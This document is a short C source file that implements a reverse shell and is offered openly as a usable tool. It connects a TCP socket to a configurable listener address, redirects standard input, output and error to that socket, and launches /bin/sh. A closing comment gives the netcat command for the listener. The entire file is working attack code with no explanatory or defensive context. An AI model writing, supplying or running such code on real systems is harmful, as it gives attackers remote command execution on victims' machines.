#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc,char const* argv[]){
    
    int sock;
    struct sockaddr_in rev_addr;

    //change to listeners ip addr and port

    char *target_ip = "127.0.0.1";
    int target_port = 4444;

    //streaming tcp socket

    sock = socket(AF_INET, SOCK_STREAM, 0 ); // IP_V4 ,TCP
    if(sock<0){
        perror("couldnt crate socket");
        return -1;
    }

    //set up taget addr
    rev_addr.sin_family = AF_INET;
    rev_addr.sin_port = htons(target_port);
    rev_addr.sin_addr.s_addr = inet_addr(target_ip);

    //connect to listener
    if(connect(sock, (struct sockaddr*)&rev_addr, sizeof(rev_addr)) < 0){
        perror("couldt connect to target");
        return -1;
    }

    //redirect stdin, stdout, stderr to the socket

    dup2(sock,0);
    dup2(sock,1);
    dup2(sock,2);

    // execute the shell
    execve("/bin/sh", NULL, NULL);
    
    
    
    
    printf("working...\n");
    return 0;
}

//nc -lvnp 4444 to set up listener
